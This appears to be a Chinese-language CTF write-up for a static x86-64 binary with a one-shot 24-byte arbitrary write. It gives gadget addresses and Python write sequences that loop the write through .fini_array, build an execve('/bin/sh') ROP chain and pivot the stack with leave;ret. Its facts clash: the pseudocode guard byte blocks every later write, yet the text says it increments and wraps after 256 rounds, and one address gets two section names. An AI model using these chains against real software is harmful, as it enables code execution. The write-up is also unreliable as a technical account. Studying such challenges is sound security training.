## 题目概览

一个静态链接、已 strip 的 x86-64 ELF 二进制（无 PIE、无 canary、开启 NX）。程序只提供一个任意写原语：提示输入一个地址和 24 字节数据，把数据写到该地址，然后退出。目标是把这一次写入变成 shell。

```bash
checksec:
  Arch:     amd64-64-little
  RELRO:    Partial RELRO
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x400000)
```

**二进制类型：** 静态链接（没有 libc.so —— 所有 libc 函数都被内联）。没有动态加载器，也没有通常意义上的 GOT/PLT。

## 逆向分析

### `main` (0x401B6D)

`main` 函数很简单：

```c
// Pseudocode of main @ 0x401B6D
void main() {
    char buf[24];
    unsigned long addr;

    write(1, "addr:", 5);
    read(0, buf, 24);
    addr = strtoul(buf, NULL, 10);  // parse address as decimal

    write(1, "data:", 5);
    read(0, buf, 24);               // read exactly 24 bytes of data

    // Guard: only write once (byte at 0x4B9330 is checked)
    if (byte_4B9330 != 0) {
        return;                     // exit without writing
    }
    byte_4B9330 = 1;
    memcpy((void *)addr, buf, 24);  // arbitrary 24-byte write
}
```

**关键细节：**

- 地址通过 `strtoul` 按**十进制**（或带 `+` 前缀）字符串解析
- 数据恰好是 **24 字节**（3 个 qword）
- `0x4B9330` 处的**一次性守卫**阻止重入 —— 一旦置 1，后续调用会直接跳过写入
- 之后程序走正常退出路径：`main` → `__libc_start_main` → `exit()` → `.fini_array` 析构函数

### `__libc_csu_fini` (0x402960)

`exit()` 期间调用的析构函数调用例程：

```asm
; __libc_csu_fini @ 0x402960
; Calls .fini_array entries in REVERSE order: [1], then [0]
mov  rbp, qword [0x4B40F8]   ; .fini_array end pointer
...
0x402988: call qword [rbp+rbx*8]  ; call .fini_array[i]
; decrements rbx, loops until rbx == -1
```

**关键行为：** `__libc_csu_fini` 运行时：

- `rbp` 被设为 `.fini_array` 基址（`0x4B40F0`）
- 先调用 `.fini_array[1]`，再调用 `.fini_array[0]`
- 调用完 `.fini_array[0]` 后，`rbp` 仍指向 `0x4B40F0`

## 漏洞

### V1 — 无限制任意写（主要）

**根因：** `main` 把 24 字节写到任意用户提供的地址，没有任何边界检查。`0x4B40F0` 处的 `.fini_array` 可写（Partial RELRO），且程序不是 PIE，因此所有地址都是已知的。

```c
memcpy((void *)addr, buf, 24);  // write 24 bytes anywhere
```

### V2 — `.fini_array` 循环：一次写入 → 无限写入

**根因：** `.fini_array` 在 `exit()` 期间被调用。把它覆盖为 `{__libc_csu_fini, main}` 就构造出一个自我强化的循环：

1. `exit()` → `__libc_csu_fini` → 调用 `.fini_array[1]` = `main` → 用户再获得一次写入
2. `main` 返回 → `__libc_csu_fini` 继续 → 调用 `.fini_array[0]` = `__libc_csu_fini` → 循环重复

**`0x4B9330` 处的守卫字节**在 256 次迭代后回绕（它是每次调用都会自增的 `uint8_t`），所以写入可以持续 256 轮。

```python
# Turn one write into infinite writes:
write(0x4B40F0, p64(0x402960) + p64(0x401B6D))
#                    __libc_csu_fini    main
```

### V3 — 通过 `leave; ret` 做栈迁移

**根因：** `main` 末尾（地址 `0x401C4B`）有一条 `leave; ret`。由于析构调用期间 `rbp` 指向 `.fini_array`（`0x4B40F0`），把 `leave; ret` 当作 `.fini_array[0]` 执行时，会令 `rsp = 0x4B40F0 + 8 = 0x4B40F8`，把栈迁移到攻击者已放置 ROP 链的可写内存。

```asm
; 0x401C4B:
leave       ; rsp = rbp; pop rbp → rsp = 0x4B40F8
ret         ; pop rip from 0x4B40F8 → jumps to value at .fini_array[1]
```

## 关键地址

| 地址 | 符号 | 用途 |
|------|------|------|
| `0x4B40F0` | `.fini_array[0]` | 第一个析构函数（第二个被调用） |
| `0x4B40F8` | `.fini_array[1]` | 第二个析构函数（第一个被调用） |
| `0x402960` | `__libc_csu_fini` | 析构调用器 —— 构造循环 |
| `0x401B6D` | `main` | 任意 24 字节写 |
| `0x401C4B` | `leave; ret` | 栈迁移 gadget（main 末尾） |
| `0x4B9330` | guard byte | 一次性写入守卫（256 次后回绕） |

## ROP Gadget（静态链接 —— 数量充足）

```python
POP_RDI  = 0x401696   # pop rdi; ret
POP_RSI  = 0x406C30   # pop rsi; ret
POP_RDX  = 0x446E35   # pop rdx; ret
POP_RAX  = 0x41E4AF   # pop rax; ret

LEAVE_RET = 0x401C4B  # leave; ret

```

```python
ADD_RAX_1 = 0x471810  # add rax, 1; ret (for building rax=59 incrementally)
XOR_RAX   = 0x442110  # xor rax, rax; ret
```

## 利用路径

所有解法都遵循同样的三阶段思路，区别只在 ROP 链的构造细节。

---

### 路径 A — `.fini_array` 循环 + 在 `.fini_array+0x10` 直接布置 ROP + `leave; ret` 迁移（最常见）

**使用占比：** 约 90% 的解法（138、1316、1763、11445、11699、12245、13060、13484、15522、15883、15989、16439、16609、16991、17048、18324、exp.py 等）

**步骤：**

1. **构造写入循环：** 第一次写入把 `.fini_array` 覆盖为 `{__libc_csu_fini, main}`，从而获得无限次 24 字节写入。

```python
write(0x4B40F0, p64(0x402960) + p64(0x401B6D))
```

2. **写入 ROP 链**到从 `.fini_array + 0x10`（或 `.bss`、任意可写区）开始的内存。该链执行 `execve("/bin/sh", NULL, NULL)`：

```python
# Typical chain written in 24-byte chunks:
write(0x4B4100, p64(POP_RAX) + p64(59)       + p64(POP_RDI))
write(0x4B4118, p64(BINSH)   + p64(POP_RSI)  + p64(0))
write(0x4B4130, p64(POP_RDX) + p64(0)        + p64(SYSCALL))
```

3. **写入 `/bin/sh\0`** 到已知可写地址（BSS 或链之后的位置）。

4. **触发迁移：** 最后一次写入用 `leave; ret` 覆盖 `.fini_array[0]`。当 `main` 返回、`__libc_csu_fini` 把它当作析构函数调用时：

   - `leave` 令 `rsp = rbp + 8 = 0x4B40F8`
   - `ret` 弹出下一个值作为 RIP → 开始执行 ROP 链

```python
write(0x4B40F0, p64(0x401C4B))  # leave; ret
```

**变体 —— 链的放置位置：** 有人把 ROP 放在 `.fini_array + 0x10`（与数组连续），有人放在 `.bss`（`0x4B9300+`）或 `.data.rel.ro`（`0x4B4100`）。迁移地址只需要让 `leave; ret` 时栈落在 `0x4B40F8`，因此 `.fini_array[1]` 必须链上的第一个 gadget。

```python
# Final write (common pattern):
write(0x4B40F0, p64(LEAVE_RET) + p64(POP_RDI) + p64(BINSH))
# leave;ret pivots rsp to 0x4B40F8, pops POP_RDI as rip
```

---

### 路径 B — ROPgadget 自动链：`mov [rsi], rax` + `add rax, 1`（变体）

**使用解法：** 11968、14605、15989

这些解法没有用带立即数 59 的 `pop rax; ret`，而是使用 ROPgadget 自动生成的链：

- 用 `pop rsi; pop rax; mov [rsi], rax; ret` 把 `/bin//sh` 写到 `.data`
- 在 `xor rax, rax; ret` 之后，用 59 次 `add rax, 1; ret` 构造 `rax = 59`
- 链长得多，但避免了需要直接 pop 出 59

结果是非常长的 ROP 链（60+ 个 gadget），但效果相同。

---

### 路径 C — 通过覆盖调用目标构造替代循环（少见）

**使用解法：** 1324

不使用标准的 `.fini_array` 循环，而是覆盖 `.init_array` 并利用 init/fini 的交互：

```python
write(INIT_ARRAY, p64(stack_pivot_gadget) + p64(another_gadget))
write(FINI_ARRAY, p64(INIT_CALL) + p64(0x1337))  # trigger init_array
```

最终结果相同，只是走了不同的代码路径。

---

### 路径 D — 泄露 canary + 栈溢出 + `pop rsp` 迁移（少见）

**使用解法：** 14479

一种不寻常的思路：

1. 利用写入循环覆盖函数指针，构造读原语
2. 从内存中泄露栈 canary
3. 把 ROP 链写入 BSS
4. 用 `pop rsp; ret` → ROP 链地址覆盖返回地址
5. 发送携带 canary 的大 payload 溢出栈并完成迁移

比 `.fini_array` 方案复杂得多。

---

### 路径 E — `__exit_funcs` / 自定义调用链（少见）

**使用解法：** 1351

利用更深的 glibc 内部结构（`0x4B9FC0` 处的 `__exit_funcs`）劫持退出处理器链，而不是更简单的 `.fini_array` 方案。写入伪造的函数描述符，通过 `leave; ret` 重定向到 ROP 链。

## 利用流程图

```asm
One-shot write
    │
    ▼
Overwrite .fini_array = {__libc_csu_fini, main}
    │
    ▼
main returns → exit() → __libc_csu_fini
    │                         │
    │    calls .fini_array[1] = main  ◄──── User gets another write
    │                         │
    │    calls .fini_array[0] = __libc_csu_fini  ◄──── Loop continues
    │
    ▼  (after writing ROP chain + /bin/sh)
Overwrite .fini_array[0] = leave;ret
    │
    ▼
leave;ret pivots rsp to .fini_array+8
    │
    ▼
ROP chain: execve("/bin/sh", 0, 0) → shell
```
